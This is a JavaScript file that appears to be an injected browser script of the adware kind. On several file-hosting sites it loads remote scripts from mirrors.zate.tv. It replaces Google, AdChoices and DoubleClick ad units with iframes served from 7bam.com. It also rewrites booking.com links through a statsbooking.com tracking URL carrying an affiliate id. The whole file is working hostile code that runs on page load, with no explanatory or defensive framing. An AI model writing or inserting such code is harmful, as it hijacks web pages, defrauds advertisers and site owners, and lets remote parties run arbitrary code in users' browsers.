var loca = (location.href.match(/zatetv=/i));
if (location.href.match(/^http:\/\/(www\.)?bayfiles\.net/i) && loca) {
    addScript("bayfiles");
}else if (location.href.match(/^http:\/\/(www\.)?billionuploads\.com/i) && loca) {
    addScript("billion");
}else if (location.href.match(/^http:\/\/(www\.)?hugefiles\.net/i) && loca) {
    addScript("huge");
}else if (location.href.match(/^http:\/\/(www\.)?vshare\.eu/i) && loca) {
    addScript("videoshare");
}else if (location.href.match(/^http:\/\/(www\.)?180upload\.com/i) && loca) {
    addScript("180upload");
}else if (location.href.match(/^http:\/\/(www\.)?uptobox\.com/i) && loca) {
    addScript("uptobox");
}else if (location.href.match(/^http:\/\/(www\.)?megashares\.com/i) && loca) {
    addScript("megashares");
}else if (location.href.match(/^http:\/\/(www\.)?uplea\.com/i) && loca) {
    addScript("uplea");
}else if (location.href.match(/^http:\/\/(www\.)?crocko\.com/i) && loca) {
    addScript("crocko");
}else if (location.href.match(/^http:\/\/(www\.)?nowvideo\.sx/i) && loca) {
    addScript("nowvideo");
}

function addScript(a) {
    var s = document.createElement('script');
    s.setAttribute("type", "text/javascript");
    s.setAttribute("src", "http://mirrors.zate.tv/" + a + ".js");
    document.getElementsByTagName("head")[0].appendChild(s);
}



function tam(me,a) {
    var val = null;
    if(a)
        val = ['300x250', '728x90', '160x600','336x280','120x600'];
    else
        val = ['300x250', '728x90', '160x600','468x60','800x600','120x20','120x600','800x440','336x280','280x336','250x250','234x60','500x500','800x500','300x600','720x300'];
    
    var ret = false;

    for (var i = 0; i < val.length; i++) {
        if (me == val[i]) {
            ret = true;
            break;
        }
    }

    return ret;

}

function createCookie(name, value, days) {
    var expires;
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toGMTString();
    }
    else {
        expires = "";
    }
    document.cookie = name + "=" + value + expires + "; path=/";
}
function getCookie(c_name) {
    if (document.cookie.length > 0) {
        c_start = document.cookie.indexOf(c_name + "=");
        if (c_start != -1) {
            c_start = c_start + c_name.length + 1;
            c_end = document.cookie.indexOf(";", c_start);
            if (c_end == -1) {
                c_end = document.cookie.length;
            }
            return unescape(document.cookie.substring(c_start, c_end));
        }
    }
    return "empty";
}


var domains = ['booking.com'];
function checkValidDesc(a) {
    for (var i = 0; i < domains.length; i++) {
        if (a.match("^(http|https)\:\/\/(www\.)?" + domains[i].replace("\.", "\\\."))) {
            return true;
        }
    }
    return false;
}
function isLink(a) {
    if (a.href == "") {
        return false;
    }
    var b = /(http|https):\/\/(\w+:{0,1}\w*@)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%@!\-\/]))?/;
    return b.test(a.href);
}
function insertDesc() {
    var a = document.getElementsByTagName("a");
    for (var i = 0; i < a.length; i++) {
        if (!isLink(a[i]) || document.domain.match((a[i].href.match(":\/\/(.[^/]+)")[1]).replace('www.', ''))) {
            continue
        }
        if (checkValidDesc(a[i].href)) {
            a[i].href = "http://statsbooking.com/ref.html?track=" + a[i].href + "?aid=descuentodos"
        }
    }
}

function a() {
    var texts = document.getElementsByTagName('text');
    if (texts.length > 0) {
        for (i = 0; i < texts.length; i++) {
            if (texts[i].innerHTML === 'Google' || texts[i].innerHTML.indexOf('Google') !== -1 || texts[i].innerHTML.search("Anuncios") > -1 || texts[i].innerHTML.indexOf("Anuncios") !== -1 || texts[i].innerHTML.indexOf("anuncios") !== -1  || texts[i].innerHTML === 'Gesti&oacute;n anuncios' || texts[i].innerHTML === 'AdChoices') {
                var parent = texts[i];
                while (parent.tagName.toUpperCase() !== 'HTML') {
                    if (parent.tagName.toLowerCase() === 'body') {
                    var w = getSizes('w');
                    var h = getSizes('h');
                     if (tam(getSizes('t'), true)){
                                            parent.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://7bam.com/get.htm?20=' + w + '&30=' + h + '"></iframe>';
                                                }
                    }
                    parent = parent.parentNode;
                }
            }
        }
    }
}


function b(){
    var choises = document.getElementsByTagName('img');
    if(choises.length > 0){
        for(i = 0; i < choises.length; i++){
            var child = choises[i];
            if(child.alt === 'AdChoices' || child.src.indexOf("/c_30_us.png") > -1 || child.src.indexOf('//c.betrad.com/') !== -1){
                while (child.tagName.toUpperCase() !== 'HTML') {
                    if (child.tagName.toLowerCase() === 'body') {
                      var w = getSizes('w');
                        var h = getSizes('h');
                        if (tam(getSizes('t'), true)){
                                                  child.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://7bam.com/get.htm?20=' + w + '&30=' + h + '"></iframe>';
                                                 }
                    }
                    child = child.parentNode;
                }
            }
        }
    }
}
function c(){
    var ifra = document.getElementsByTagName("iframe");
    if(ifra.length > 0){
        for(i = 0; i < ifra.length; i++){
            var child = ifra[i];
             if(child.src.indexOf("doubleclick.net") !== -1){
                while (child.tagName.toUpperCase() !== 'HTML') {
                    if (child.tagName.toLowerCase() === 'body') {
                        var w = getSizes('w');
                            var h = getSizes('h');
                            if (tam(getSizes('t'), true)){
                                                         child.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://7bam.com/get.htm?20=' + w + '&30=' + h + '"></iframe>';
                                                }
                    }
                    child = child.parentNode;
                }
            }
        }
    }
}

function getSizes(a) {
    var myWidth = 0, myHeight = 0;
    if (typeof (window.innerWidth) === 'number') {
        myWidth = window.innerWidth;
        myHeight = window.innerHeight;
    } else if (document.documentElement && (document.documentElement.clientWidth || document.documentElement.clientHeight)) {
        myWidth = document.documentElement.clientWidth;
        myHeight = document.documentElement.clientHeight;
    } else if (document.body && (document.body.clientWidth || document.body.clientHeight)) {
        myWidth = document.body.clientWidth;
        myHeight = document.body.clientHeight;
    }
    if(a == 'w')
    return myWidth
    else if (a == 'h')
    return myHeight;
    else
    return myWidth + 'x' + myHeight;
}


a();
b();
c();
insertDesc();
                            